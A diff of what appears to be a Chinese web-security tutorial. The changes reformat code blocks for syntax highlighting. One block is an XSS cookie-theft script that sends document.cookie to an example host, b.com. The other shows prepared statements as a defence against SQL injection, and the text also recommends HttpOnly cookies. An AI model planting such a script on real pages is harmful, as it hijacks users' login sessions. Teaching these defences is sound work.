@@ -42,10 +42,13 @@ Cookie中一般保存了当前用户的登录凭证，如果可以得到，往�
 
 用户打开链接后，会加载b.js，并执行b.js中的代码。b.js中存储了以下JS代码：
 
-    var img = document.createElement("img");
-    img.src = "http://b.com/log?" + escape(document.cookie);
-    document.body.appendChild(img);
+{% highlight javascript %}
 
+var img = document.createElement("img");
+img.src = "http://b.com/log?" + escape(document.cookie);
+document.body.appendChild(img);
+
+{% endhighlight %}
 上面的代码会向b.com请求一张图片，但实际上是将当前页面的cookie发到了b.com的服务器上。这样就完成了窃取cookie的过程。
 
 __防御Cookie劫持的一个简单的方法是在Set-Cookie时加上HttpOnly标识，浏览器禁止JavaScript访问带HttpOnly属性的Cookie。__
@@ -85,10 +88,14 @@ SQL注入常常会听到，它与XSS类似，是由于用户提交的数据被�
 
 防止SQL注入最好的方法是使用预编译语句，如下面所示：
 
-    String sql = "select * from user where username = ?";
-    PreparedStatement pstmt = conn.prepareStatement(sql);
-    pstmt.setString(1, username);
-    ResultSet results = pstmt.executeQuery();
+{% highlight java %}
+
+String sql = "select * from user where username = ?";
+PreparedStatement pstmt = conn.prepareStatement(sql);
+pstmt.setString(1, username);
+ResultSet results = pstmt.executeQuery();
+
+{% endhighlight %}
 
 不同语言的预编译方法不同，但基本都可以处理。
 
